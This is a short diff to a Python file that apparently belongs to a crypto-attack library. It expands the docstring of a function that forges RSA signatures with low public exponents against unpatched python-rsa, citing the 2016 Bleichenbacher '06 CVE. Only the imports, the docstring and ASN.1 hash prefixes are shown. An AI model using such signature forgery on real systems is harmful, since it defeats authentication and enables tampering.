@@ -1,8 +1,15 @@
 import binascii
 import math
 import random
+
+
 def python_rsa_bleichenbacher(hashtype,msgHashed,modulusSize,e=3):
-    'https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/'
+    """
+    This can forge RSA signatures for low exponents for the python RSA module, for any modulus
+    The CVE was reported in http://www.openwall.com/lists/oss-security/2016/01/05/3
+    So if the RSA module wasn't updated after that, you can forge the signature!
+    https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/
+    """
     HASH_ASN1 = {
         'MD5': b'\x30\x20\x30\x0c\x06\x08\x2a\x86\x48\x86\xf7\x0d\x02\x05\x05\x00\x04\x10',
         'SHA-1': b'\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14',
